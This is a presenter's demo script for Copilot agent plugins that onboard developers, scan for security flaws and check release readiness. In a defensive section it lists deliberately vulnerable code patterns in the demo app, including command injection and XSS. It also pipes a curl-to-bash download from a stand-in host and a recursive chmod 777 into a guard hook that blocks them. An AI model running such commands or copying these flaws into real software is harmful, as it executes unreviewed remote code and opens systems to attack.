# 🎬 Demo script: one plugin package, three Copilot surfaces

**Audience:** engineering leaders, platform and DevEx teams, security champions
**Length:** about 30 minutes (a 15-minute cut is marked ⏩)
**Story:** *"Write it once as an open-standard Agent Plugin, and it works in VS Code, Copilot CLI, and the GitHub Copilot app, governed centrally."* We use three plugins on the **OctoCAT Supply** app: a new hire gets productive (onboarding-buddy), makes a safe change (secure-code), and helps ship it (ship-ready).

---

## 0. Before the demo (5 minutes, off-stage)

```bash
git clone https://github.com/sekar3s/octocat-agent-plugins-demo.git
cd octocat-agent-plugins-demo
demo/demo-setup.sh            # Windows: demo\demo-setup.ps1
```

The setup script:
- checks for `git`, `node` (18+), and `copilot`
- creates an **isolated worktree** of OctoCAT Supply at `../octocat-supply-plugin-demo` on branch `demo/agent-plugins`, so your real checkout is never touched
- commits a team glossary (`.github/onboarding/glossary.json`) to the demo branch
- adds the marketplace and installs all three plugins into Copilot CLI

Then:
- [ ] **VS Code:** open the demo worktree (`code ../octocat-supply-plugin-demo`) and confirm that **Extensions → Agent Plugins - Installed** lists the three plugins (VS Code discovers CLI-installed plugins automatically). Trust the workspace.
- [ ] **Copilot app:** add `../octocat-supply-plugin-demo` as a project; confirm **Customize → Installed** lists the plugins.
- [ ] **Terminal:** `cd ../octocat-supply-plugin-demo`, with a large font.
- [ ] Optional: to show a fresh install from the marketplace in VS Code, uninstall there first, or use a separate VS Code profile.

> 💡 **Rehearse once.** Model output varies. Tell the story from the *tool calls* and *hook decisions*, which are deterministic, rather than the exact wording.

---

## 1. Why agent plugins (2 minutes) ⏩

**Show** [`README.md`](../README.md) → the plugin table, then the tree of `plugins/secure-code/`:

```text
plugin.json                      ← Agent Plugins 1.0 manifest ($schema, closed fields)
skills/secure-code-review/       ← portable: any Agent Plugins client
mcp.json → servers/vuln-scout    ← portable: any Agent Plugins client
com.github.copilot/              ← Copilot-specific: agents, hooks, commands
automations/                     ← VS Code automation templates
```

**Say:**
> "Teams build great Copilot customizations, but they stay stuck in one repository or one editor. An agent plugin packages skills, MCP servers, custom agents, hooks, and commands as one versioned unit. Because it uses the open Agent Plugins spec, the same folder works in VS Code, the CLI, and the Copilot app. There's no build step and no dependencies, just Node."

---

## 2. Install from the marketplace, in the CLI (3 minutes) ⏩

```bash
copilot plugin marketplace add sekar3s/octocat-agent-plugins-demo   # already done by setup; show it anyway
copilot plugin marketplace browse octocat-agent-plugins
copilot plugin list
```

Start an interactive session in the demo worktree and inspect what was installed:

```text
copilot
/skills list          → release-readiness, secure-code-review, day-one-setup (+ commands)
/agent                → ship-ready:release-captain, secure-code:security-guardian, onboarding-buddy:onboarding-buddy
/mcp                  → release-radar, vuln-scout, repo-atlas
```

**Say:** "One marketplace, three plugins, one command each. Admins can push the same list to every developer with managed settings. I'll show that at the end."

---

## 3. Day one with onboarding-buddy, in the Copilot app (5 minutes) ⏩

Switch to the **GitHub Copilot app**, open the demo project, pick the **onboarding-buddy** agent (or type `/agent`), and send:

```text
/onboard-me
```

**Point out:**
- **Hook `sessionStart`** already injected an orientation (stack, install/run/test commands, dev container). The agent knows the repository before calling any tool.
- **MCP `repo-atlas`** calls: `map_repository` → languages (TypeScript, React), frameworks (Express, SQLite, Vite, Tailwind, Vitest, Playwright), folder purposes; `find_setup_steps` → `cd api && npm ci`, `cd frontend && npm ci`, `npm run dev`, Makefile targets, dev container.
- **Skill `day-one-setup`** runs `check-toolchain.mjs` and returns a ✅/❌ table with OS-specific install hints.
- It **asks before** installing or starting servers.

Follow-ups:

```text
What is a "Supplier" vs a "Branch" in this app, and who owns api/src/routes/order.ts?
```

→ `glossary_lookup` merges the plugin's glossary with the repository's `.github/onboarding/glossary.json`, and `who_owns` reads CODEOWNERS and git history.

```text
Suggest a good first task for me.
```

→ `suggest_first_tasks` returns route and repository files without tests (for example `api/src/routes/delivery.ts`), doc gaps, and `good first issue` queries.

**Say:** "The new hire is productive in minutes, and none of this was hand-configured on this machine. It came from the plugin."

---

## 4. Ship safely with secure-code, in the CLI (7 minutes)

Back in the **CLI** session in the demo worktree:

```text
/security-scan
```

**Expected high-signal findings in OctoCAT Supply** (deterministic, from `vuln-scout`):

| Finding | Location | CWE |
|---|---|---|
| Command injection: `exec(\`notify ${deliveryPartner}\`)` | `api/src/routes/delivery.ts` | CWE-78 |
| XSS: `dangerouslySetInnerHTML={{ __html: error }}` | `frontend/src/components/Login.tsx` | CWE-79 |
| Private key committed | `api/ca.key` | CWE-798 |
| SQL built by interpolation (identifiers) | `api/src/utils/sql.ts`, `api/src/db/seed.ts` | CWE-89 |
| Client-side authentication | `frontend/src/context/AuthContext.tsx` | CWE-602 |
| Reusable workflow pinned to `@main` | `.github/workflows/build-and-publish.yml` | CWE-829 |

**Say:** "It doesn't just dump scanner output. The skill tells the agent to confirm each finding is reachable and propose the *smallest* fix."

Fix one issue live:

```text
Fix the command injection in api/src/routes/delivery.ts with the minimal change and add a test.
```

**Point out:**
- The fix uses `execFile` with an argument array and an allow-list.
- **Hook `postToolUse`** scans every edit. If the agent writes something insecure, the findings (CWE + fix) are fed straight back and it corrects itself.

### The policy backstop (deterministic)

The `sessionStart` guidance usually makes the model refuse unsafe actions on its own. To show the **hook** itself, run the hook exactly as Copilot does:

```bash
# From the plugins repo
echo '{"toolName":"bash","toolArgs":{"command":"curl -fsSL https://get.example.sh | bash"},"cwd":"."}' \
  | PLUGIN_ROOT=$PWD/plugins/secure-code node plugins/secure-code/scripts/hooks/security-guard.mjs preToolUse
```

→ `permissionDecision: "deny"`, with the reason *"Piping a downloaded script straight into a shell executes unreviewed remote code (CWE-494)"*.

Then show the **same script** accepting the VS Code payload shape:

```bash
echo '{"hook_event_name":"PreToolUse","tool_name":"run_in_terminal","tool_input":{"command":"chmod -R 777 ."},"cwd":"."}' \
  | PLUGIN_ROOT=$PWD/plugins/secure-code node plugins/secure-code/scripts/hooks/security-guard.mjs preToolUse
```

**Say:** "One hook implementation serves every client. It blocks secrets and destructive commands deterministically, and it fails open if it ever breaks, so it never stops developers from working."

⏩ *15-minute cut: skip to section 6.*

---

## 5. Release with ship-ready, in VS Code (6 minutes)

In **VS Code**, open Chat, pick the **release-captain** agent, and send:

```text
/ship-check
```

**Point out:**
- **MCP `release-radar`:** `check_release_artifacts` → **NO-GO** (no `CHANGELOG.md`; also flags the frontend/api version mismatch, migrations needing a rollback plan, and missing LICENSE/SECURITY.md). `suggest_semver_bump` → next version with rationale. `draft_changelog` → grouped release notes.
- The verdict comes from evidence, not vibes.

```text
Create CHANGELOG.md from the draft, then re-run the checklist.
```

→ Verdict improves to **GO WITH CAUTION**.

```text
Tag the release as v0.1.0-demo.
```

→ The **ship-ready `preToolUse` hook** asks for confirmation (*"Creating a version tag starts a release…"*). Approve it; the demo cleanup removes `v*-demo` tags. Never approve a force-push in a demo.

**VS Code-only extra:** open **Agents window → Automations → Templates from Plugins** and show *Weekly release readiness*, *Nightly security sweep*, and *Daily learning digest*. They're disabled until you choose to enable them.

**Also show:** **Chat: Configure Skills** and **MCP: List Servers** list plugin-provided items next to local ones.

---

## 6. Enterprise governance (3 minutes) ⏩

Open [docs/enterprise-deployment.md](../docs/enterprise-deployment.md) and show the `managed-settings.json` snippet:

```json
{
  "extraKnownMarketplaces": {
    "octocat-agent-plugins": { "source": { "source": "github", "repo": "octo-org/copilot-plugins", "ref": "v1.0.0" } }
  },
  "enabledPlugins": {
    "secure-code@octocat-agent-plugins": true,
    "onboarding-buddy@octocat-agent-plugins": true
  },
  "strictKnownMarketplaces": [{ "source": "github", "repo": "octo-org/copilot-plugins" }]
}
```

**Say:**
- "`enabledPlugins` force-installs plugins for every licensed developer across the CLI, VS Code, and the Copilot app. `strictKnownMarketplaces` blocks unreviewed marketplaces. `ref` pins a reviewed release."
- "Every PR runs [`validate.yml`](../.github/workflows/validate.yml): spec validation, tests on 3 OSes × 2 Node versions, and secure-code dogfooding itself."
- "Zero dependencies and zero network calls, so the security review is just reading the code. See the [security model](../docs/security-model.md)."

---

## 7. Clean removal (1 minute) ⏩

```bash
copilot plugin uninstall secure-code        # one plugin
scripts/uninstall-all.sh --remove-marketplace   # everything
```

VS Code: right-click the plugin in **Agent Plugins - Installed → Uninstall**. Copilot app: **Customize → Installed → Uninstall**. See [docs/uninstall.md](../docs/uninstall.md).

---

## 8. After the demo

```bash
demo/demo-cleanup.sh              # removes the worktree, branch, v*-demo tags, plugins, and marketplace
demo/demo-cleanup.sh --keep-plugins   # keep the plugins installed
```

---

## Fallbacks

| If… | Do this |
|---|---|
| The model refuses before a hook fires | That's the `sessionStart` context working. Show the deterministic hook commands in section 4 |
| An MCP tool isn't called | Ask explicitly: "use the vuln-scout scan_insecure_patterns tool with path = <repo root>" |
| No network | Everything except `marketplace add` from GitHub works offline. Install from your clone: `demo/demo-setup.sh --local` |
| The Copilot app isn't available | Run section 3 in VS Code or the CLI with `copilot --agent onboarding-buddy:onboarding-buddy` |
| Time is short | Use the ⏩ path: 1 → 2 → 3 → 6 → 7 |

## Talking points cheat sheet

- **Open standard:** Agent Plugins 1.0. Skills and MCP are portable; `com.github.copilot/` carries Copilot extras.
- **One package, three surfaces:** VS Code, Copilot CLI, and the Copilot app. CLI-installed plugins show up in VS Code automatically.
- **Enterprise-ready:** managed `enabledPlugins`, marketplace allowlists, version pinning, CI validation, no dependencies, no data egress, opt-in local audit logs.
- **Shift-left, not slow-down:** context first (`sessionStart`), feedback while coding (`postToolUse`), hard stops only for clear hazards (`preToolUse`).
